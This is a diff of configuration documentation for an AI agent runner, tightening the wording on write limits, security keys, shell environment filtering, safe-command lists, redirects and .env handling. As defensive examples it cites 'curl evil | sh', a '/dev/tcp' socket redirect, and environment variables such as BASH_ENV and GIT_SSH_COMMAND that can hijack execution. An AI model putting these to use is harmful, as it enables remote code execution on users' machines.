@@ -45,7 +45,7 @@ shell_hint           = true          # global master switch, see below
 | `request_timeout_secs` | integer | unset | Unset means the 15 minute ceiling. A stage's `[stages.<name>.model] request_timeout_secs` wins for that stage |
 | `taint_tracking` | bool | `false` | Turns on [taint tracking](/docs/security) for every agent. With it off, an agent can still opt in itself |
 | `batch_tool_hint` | bool | `true` | Adds a short hint telling the model it may batch independent tool calls |
-| `shell_hint` | bool | `true` | Adds a short hint describing the shell a stage will get. Only says anything on platforms that need it, today just Windows |
+| `shell_hint` | bool | `true` | Adds a short hint describing the shell a stage will get. Only says anything on Windows today |
 
 All three of those cascade: a stage setting beats an agent setting, which beats this file.
 
@@ -92,8 +92,8 @@ fallback_order      = ["anthropic/claude-sonnet-5", "openai/gpt-5.6-mini"]
 
 `anthropic_cache_ttl` is how long a cached prompt prefix survives. The default `5m` is free; `1h`
 costs more to write and sends the beta header it needs. It is worth the write cost for a staged
-agent: stages routinely take longer than five minutes when one of them is running scripts, so a
-prefix cached at the start of a run is cold by the time a later stage could have reused it.
+agent. Stages routinely take longer than five minutes, especially when one is running scripts. A
+prefix cached at the start of a run is then cold by the time a later stage could have reused it.
 
 `claude_code_enabled` is off unless you turn it on. See
 [Providers](/docs/providers#claude-code-transport) for the terms note that goes with it.
@@ -159,8 +159,8 @@ can see *how* it ended rather than finding it gone. `0` drops it immediately. Th
 memory, so a daemon restart clears it whatever you set.
 
 **`wedge_timeout_secs`** fails a run that is sitting in a state no part of the engine can reach,
-rather than leaving it reported as running. It never fires on a run that is merely slow: an agent
-waiting on the model, a tool, its sub-agents, or a person is exempt however long it takes. It is off
+rather than leaving it reported as running. A slow run never trips it: an agent waiting on the
+model, a tool, its sub-agents, or a person is exempt however long it takes. It is off
 by default because it fails runs, and that should be your decision. `300` is sensible if something
 outside Leviath is tracking your slots. See [External work queues](/docs/work-queues).
 
@@ -178,13 +178,14 @@ never counts as consent. `0` waits indefinitely. See
 <a id="security"></a>
 
 **`max_tool_call_write_bytes`** and **`max_run_write_bytes`** bound how much an agent puts on disk.
-Both are **unset in code and written by `lev setup`**, which is the unusual part and deliberate: how
-much an agent should be allowed to write depends on what you are doing with it, so Leviath imposes
-nothing on a config it did not write. A fresh install gets concrete numbers here, where you can see
-them and **delete the line to remove the limit**.
+Both are **unset in code and written by `lev setup`**, which is the unusual part and is deliberate.
+How much an agent should be allowed to write depends on what you are doing with it, so Leviath
+imposes nothing on a config it did not write. A fresh install gets concrete numbers here, where you
+can see them and **delete the line to remove the limit**.
 
-The incident behind them was a single shell call appending in a loop until the 60-second timeout -
-about 14 GB from one call that looked ordinary - repeated until the disk was full.
+The incident behind them was a single shell call appending in a loop until the 60-second timeout.
+That put about 14 GB on disk from one call that looked ordinary, and it repeated until the disk was
+full.
 
 They work differently because they have to. `write_file` and `edit_file` carry their content as an
 argument, so an oversized one is refused before a byte lands. A shell redirect does not: those bytes
@@ -194,8 +195,8 @@ call. That stops the call after the one that overran, not the one that did.
 Running out of disk is separate and **not configurable**. Leviath refuses any write that would leave
 under a gigabyte free, whatever these two say and whatever `--yolo` says, because filling the disk
 harms every other process on the machine rather than just the run. A filesystem whose free space
-cannot be read is treated as unknown and allowed - a guard that cannot measure has nothing to say -
-and the two ceilings above still apply to it.
+cannot be read is treated as unknown and allowed, because a guard that cannot measure has nothing to
+say. The two ceilings above still apply to it.
 
 ## `[security]`
 
@@ -218,17 +219,36 @@ credential_store           = "file"   # file | keychain
 
 | Key | Default | Notes |
 |---|---|---|
-| `allowed_workdirs` | `[]` | Directories a run's workdir may sit under without being confirmed. Empty asks only about the alarming cases: a home directory or a filesystem root. Listing a path silences the prompt for everything under it |
-| `allow_seed_commands` | `true` | Whether a blueprint's `seed = { command = "..." }` regions may run at all. They execute at spawn, before the first approval prompt, so a seed also has to be covered by `[safe_commands]` - there is nobody to ask in the moment. `--no-seed-commands` refuses them for one run |
-| `allow_local_network` | `false` | Whether agent fetches may reach loopback, private, and link-local addresses. Off, this blocks cloud metadata, your own `lev serve`, and the LAN |
-| `allow_env_vars` | `[]` | Credential-shaped variable names a Rhai script may read through `env_var()`. Matching is exact and case-insensitive, and there is no wildcard |
+| `allowed_workdirs` | `[]` | Directories a run's workdir may sit under without being confirmed. See below |
+| `allow_seed_commands` | `true` | Whether a blueprint's `seed = { command = "..." }` regions may run at all. See below |
+| `allow_local_network` | `false` | Whether agent fetches may reach loopback, private, and link-local addresses. See below |
+| `allow_env_vars` | `[]` | Credential-shaped variable names a Rhai script may read through `env_var()`. Exact and case-insensitive, no wildcards |
 | `allow_blueprint_read_paths` | `false` | Honors every blueprint's `[read_paths]` as written. Prefer a per-agent grant for anything you did not author |
 | `allow_blueprint_safe_commands` | `false` | Honors every blueprint's `[safe_commands]` as written. Off, an installed agent cannot pre-approve its own shell |
-| `allow_blueprint_permissions` | `false` | Honors every blueprint's `[tool_permissions]` even where it exceeds the built-in default for a tool you have not configured. Off, a blueprint may still pre-approve `web_search` and `web_fetch`; anything else is clamped to the default. Name the tool under `[agent_tool_permissions.<agent>]` to grant it per agent instead |
+| `allow_blueprint_permissions` | `false` | Honors every blueprint's `[tool_permissions]`, even above the built-in default. See below |
 | `shell_env` | `"filtered"` | Which of the daemon's environment variables a shell command inherits. See below |
 | `shell_env_withhold` | `[]` | The names `shell_env = "custom"` withholds. Ignored under every other mode |
-| `read_paths` | `[]` | Machine-wide read grants. A grant only applies to a path the blueprint also declares, so listing one here opens nothing by itself |
+| `read_paths` | `[]` | Machine-wide read grants, which apply only where a blueprint declares the path too. See below |
 | `credential_store` | `"file"` | `keychain` moves secrets to the OS credential store. Run `lev auth migrate` after changing it |
+
+Five of those need more than a table cell.
+
+**`allowed_workdirs`** silences the confirm prompt for everything under a listed path. Left empty,
+`lev run` asks only about the alarming cases: a home directory, or a filesystem root.
+
+**`allow_seed_commands`** covers commands that run at spawn, before the first approval prompt.
+Because there is nobody to ask at that moment, a seed command also has to be covered by
+`[safe_commands]`. `--no-seed-commands` refuses seed commands for one run.
+
+**`allow_local_network`** is off by default. Off, an agent's fetches cannot reach cloud metadata
+endpoints, your own `lev serve`, or anything else on your LAN.
+
+**`allow_blueprint_permissions`** off still lets a blueprint pre-approve `web_search` and
+`web_fetch`. Anything else is clamped to the built-in default. To grant one tool to one agent
+instead, name it under `[agent_tool_permissions.<agent>]`.
+
+**`read_paths`** opens nothing on its own. A grant applies only to a path the blueprint also
+declares, so both halves have to name it.
 
 Grant entries (here and in `[agent_read_paths]`) take three forms: an exact path, which grants its
 subtree; `glob:` patterns; and `regex:` patterns, auto-anchored. Both patterns are matched against
@@ -253,8 +273,8 @@ does not find. `lev list` and `lev ps` carry the same counts.
 
 `[tool_permissions]` sets a machine-wide ceiling. A blueprint's own `[tool_permissions]` may
 tighten it but never loosen it. For a tool you have not listed here there is no ceiling to clamp
-against, so a blueprint may raise it no higher than the built-in default - except `web_search` and
-`web_fetch`, which read-only research agents pre-approve. To let a blueprint go further, name the
+against, so a blueprint may raise it no higher than the built-in default. The exceptions are
+`web_search` and `web_fetch`, which read-only research agents pre-approve. To go further, name the
 tool under `[agent_tool_permissions.<agent>]`, or set `[security] allow_blueprint_permissions`.
 
 ```toml
@@ -286,14 +306,15 @@ inherit. All three answer to the same setting, so a script with `shell` is not a
 
 | Mode | What it withholds |
 |---|---|
-| `filtered` (default) | Credential-shaped names, **except `SSH_AUTH_SOCK`** - so `git push` over agent keys still works |
-| `strict` | The same, plus `SSH_AUTH_SOCK`, `AWS_PROFILE`, `AWS_REGION`, `KUBECONFIG`, `NETRC`. Breaks `git push`, `aws` and `kubectl` in a shell tool until you list what you need |
+| `filtered` (default) | Credential-shaped names, **except `SSH_AUTH_SOCK`**, so `git push` over agent keys still works |
+| `strict` | The same, plus `SSH_AUTH_SOCK`, `AWS_PROFILE`, `AWS_REGION`, `KUBECONFIG`, `NETRC`. See below |
 | `custom` | Exactly the names in `shell_env_withhold`, and nothing inferred |
 | `inherit` | Nothing |
 
-Toolchain variables pass through under every mode: `PATH`, `HOME`, `CARGO_HOME`, `JAVA_HOME`,
-`VIRTUAL_ENV`, `NVM_DIR`, `GOPATH`, `DOCKER_HOST`, `TERM`. `allow_env_vars` hands a specific name
-over under every mode too, so one list means one thing whichever surface asks.
+`strict` breaks `git push`, `aws` and `kubectl` inside a shell tool until you list the names those
+commands need. Toolchain variables pass through under every mode: `PATH`, `HOME`, `CARGO_HOME`,
+`JAVA_HOME`, `VIRTUAL_ENV`, `NVM_DIR`, `GOPATH`, `DOCKER_HOST`, `TERM`. `allow_env_vars` hands a
+specific name over under every mode too, so one list means one thing whichever surface asks.
 
 ```toml
 [security]
@@ -304,15 +325,15 @@ allow_env_vars     = ["MY_PROVIDER_KEY"]
 
 Be clear about what this buys. With `cat` and `grep` on the default safe list, a granted shell can
 read `~/.leviath/config.toml` and find the provider key anyway. This is defence in depth against
-accidental leakage - an `env` in tool output, a `printenv` in a log, a subprocess that phones home -
-and it closes the command-seed case, where nothing was ever approved. It is not a boundary. For one,
-use `[sandbox]`.
+accidental leakage: an `env` in tool output, a `printenv` in a log, a subprocess that phones home.
+It also closes the command-seed case, where nothing was ever approved. It is not a boundary. For
+one, use `[sandbox]`.
 
 ## `[safe_commands]` and `[agent_safe_commands.<agent>]`
 
 A permission is per tool name, which for the shell is a choice between a prompt on every `ls` and no
 prompt on `curl evil | sh`. These entries are argument-scoped, and can only turn an `ask` into an
-`allow` - never a configured `deny`.
+`allow`. They never lift a configured `deny`.
 
 ```toml
 [safe_commands]
@@ -327,10 +348,16 @@ allow_blueprint = true          # honour this agent's own [safe_commands]
 
 | Key | Default | Notes |
 |---|---|---|
-| `defaults` | `true` | The shipped read-only verb list. An entry on it must not be able to write a file, run another program, or open a connection under any flag, which is why `find`, `sed`, `awk`, `sort`, `xargs`, `env` and `cargo` are absent - and why `uniq` (writes its second operand), `tree` (`-o`) and `rg` (`--pre` runs a command) were removed. Add any of them back by name if you want them unprompted |
+| `defaults` | `true` | The shipped read-only verb list. See below |
 | `tools` | `[]` | Tools that never prompt whatever their arguments. Built-in names, or MCP names as advertised (`server__tool`) |
 | `shell` | `[]` | A program, optionally with the subcommand that narrows it. `git status`, never `git` or `cargo test --lib`. Also `env:NAME`, below |
 | `allow_blueprint` | `false` | Per-agent only. Honour that agent's own `[safe_commands]` block |
+
+An entry on the `defaults` list has to clear one bar: under any flag, it must not be able to write a
+file, run another program, or open a connection. That is why `find`, `sed`, `awk`, `sort`, `xargs`,
+`env` and `cargo` are absent from it. It is also why `uniq` (it writes its second operand), `tree`
+(`-o`) and `rg` (`--pre` runs a command) were taken off. Add any of them back by name if you want
+them unprompted.
 
 A shell entry covers the program it names with any arguments, so `cat` covers `cat notes.md`. It
 does not cover a line that also runs something else: `cat notes.md && curl evil` still asks, because
@@ -361,7 +388,7 @@ pipefail` is unaffected, since shell options change nothing about which program 
 ### Redirects
 
 `echo x > file` writes a file, and no tool name in the call says so. A shell call that redirects
-output is therefore held to the `write_file` policy as well as the shell's own: where `write_file`
+output is therefore held to the `write_file` policy as well as the shell's own. Where `write_file`
 is `deny` the call is refused, and it is never quieter than a `write_file` call would have been.
 That is what stops a redirect being a spelling of `write_file` that a `deny` never sees.
 
@@ -371,16 +398,17 @@ Each target is also its own key, so an approval names what is being written:
 Allow cat notes.md, >/tmp/report.txt for this run
 ```
 
-Unlike a program, a write cannot be pre-approved in a config file - `[safe_commands] shell` rejects
-any entry beginning with `>`. A write is approved by a person, per target, or not at all.
+A write cannot be pre-approved in a config file the way a program can. `[safe_commands] shell`
+rejects any entry beginning with `>`. A write is approved by a person, per target, or not at all.
 
-Three shapes cost nothing, because they write nothing that outlives the call: `/dev/null`,
-`/dev/stdout`, `/dev/stderr`, `/dev/tty` and `/dev/fd/*`; descriptor duplications such as `2>&1`;
-and read redirects, since a program that can read a file could already read it. So `cargo build >
-/dev/null 2>&1` and `cat notes.md 2>/dev/null` are as quiet as they were.
+Three shapes cost nothing, because they write nothing that outlives the call. The first is the
+throwaway devices: `/dev/null`, `/dev/stdout`, `/dev/stderr`, `/dev/tty` and `/dev/fd/*`. The second
+is a descriptor duplication such as `2>&1`. The third is a read redirect, since a program that can
+read a file could already read it. So `cargo build > /dev/null 2>&1` and `cat notes.md 2>/dev/null`
+are as quiet as they were.
 
 Two shapes cannot be granted at all. A target that only exists after expansion (`> $OUT`) names a
-different file on every run, and bash's `> /dev/tcp/host/port` is a socket rather than a file, which
+different file on every run. Bash's `> /dev/tcp/host/port` is a socket rather than a file, which
 makes the redirect a network channel no program name describes. Both prompt every time.
 
 <a id="tool_script_permissions"></a>
@@ -455,8 +483,8 @@ see: that table takes any name, so a misspelled provider deserializes perfectly 
 nothing.
 
 This is a warning, not an error. Every command reads `config.toml`, so one stale key should not take
-the CLI down - unlike a blueprint, which is authored and validated deliberately and fails on an
-unknown key.
+the CLI down. A blueprint is different: it is authored and validated deliberately, and it fails on
+an unknown key.
 
 The one place unrecognized keys are *kept*: `[model_providers.<name>]` forwards anything it does not
 recognize to the Rhai script, so those are read and never reported.
@@ -503,8 +531,8 @@ Three sources, narrowest first:
    128,000 tokens.
 
 The reason this order matters is that region budgets are percentages of the window. A `budget = "30%"`
-region on a model that really holds 1M tokens is 314,572 tokens if the window is known and 38,400 if
-it fell back, with no error either way - the agent just evicts working material early and looks like
+region on a model that really holds 1M tokens is 314,572 tokens if the window is known, and 38,400
+if it fell back. Neither case raises an error. The agent evicts working material early and reads as
 a worse model.
 
 A provider that cannot be reached at start-up costs nothing but the fallback: Leviath warns, keeps
@@ -513,7 +541,7 @@ the line that fixes it.
 
 > [!NOTE]
 > Region budgets written as percentages resolve against `max_context_tokens`, so a wrong window is
-> not cosmetic: a `budget = "30%"` region on a model assumed to be 128k gets 38 400 tokens instead
+> not cosmetic. A `budget = "30%"` region on a model assumed to be 128k gets 38 400 tokens instead
 > of the 314 572 a 1M-token model would give it. OpenRouter fronts far more models than any built-in
 > table names, so Leviath warns once per model when it falls back to a conservative window and tells
 > you the line to add here.
@@ -624,19 +652,19 @@ Leviath reads a `.env` file from the working directory unless `LEVIATH_SKIP_DOTE
 that one file, never a walk up the tree, and a variable you have already exported always wins.
 
 A cloned repository *is* the working directory, so its `.env` is content somebody else wrote.
-Credentials from it load normally - that is what the feature is for - but the handful of names that
-decide where configuration comes from or what gets executed are ignored, with a warning naming them:
-the `LEVIATH_` namespace, `PATH`, `SHELL`, `EDITOR`, `VISUAL`, the `LD_*` and `DYLD_*` loader
-variables, and the interpreter and tool hook variables that turn a later command into code
-execution (`BASH_ENV`, `GIT_SSH_COMMAND` and the other `GIT_*` hooks, `PAGER`, `NODE_OPTIONS`,
-`PYTHONSTARTUP`, `PYTHONPATH`, `PERL5OPT`, `RUBYOPT`, `JAVA_TOOL_OPTIONS`, `RUSTC_WRAPPER`, and
-their kin). Without that, one line of `LEVIATH_CONFIG_PATH` in a repository you cloned would point
+Credentials from it load normally, which is what the feature is for. The handful of names that
+decide where configuration comes from, or what gets executed, are ignored instead, with a warning
+naming them. That covers the `LEVIATH_` namespace, `PATH`, `SHELL`, `EDITOR`, `VISUAL`, and the
+`LD_*` and `DYLD_*` loader variables. It also covers the interpreter and tool hook variables that
+turn a later command into code execution: `BASH_ENV`, `GIT_SSH_COMMAND` and the other `GIT_*` hooks,
+`PAGER`, `NODE_OPTIONS`, `PYTHONSTARTUP`, `PYTHONPATH`, `PERL5OPT`, `RUBYOPT`, `JAVA_TOOL_OPTIONS`,
+`RUSTC_WRAPPER`, and their kin. Without that, one line of `LEVIATH_CONFIG_PATH` in a repository you cloned would point
 Leviath at a config file of its choosing, with its own MCP server commands and tool permissions.
 Export those yourself if you meant them.
 
 | Variable | Effect |
 |---|---|
-| `LEVIATH_HOME` | Redirects the whole data root. Every home-relative path honors it, which is what makes an isolated test or a second install possible |
+| `LEVIATH_HOME` | Redirects the whole data root. Every home-relative path honors it, so an isolated test or a second install works |
 | `LEVIATH_CONFIG_PATH` | Path to an exact config file, bypassing the default location |
 | `LEVIATH_SKIP_DOTENV` | Set to skip `.env` loading |
 | `LEVIATH_RUNS_DIR` | Overrides where run directories are written |
